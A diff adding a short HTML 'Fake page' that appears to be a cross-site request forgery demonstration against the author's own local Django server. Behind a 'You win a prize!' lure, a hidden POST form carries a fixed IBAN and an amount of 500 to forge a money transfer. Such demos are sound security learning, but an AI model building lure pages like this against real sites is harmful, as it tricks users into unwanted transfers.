@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Fake page</title>
+    </head>
+
+    <body>
+        <h1>You win a prize!</h1>
+        <p>Click the button to claim your prize</p>
+        <!-- This form aims to sumbit a request to my django server-->
+        <form method="POST" action="http://127.0.0.1:8000/">
+            <input type="hidden" name="iban" value="1234567890123456789">
+            <input type="hidden" name="amount" value="500">
+            <button type="submit">Claim your prize</button>
+    </body>
+</html>
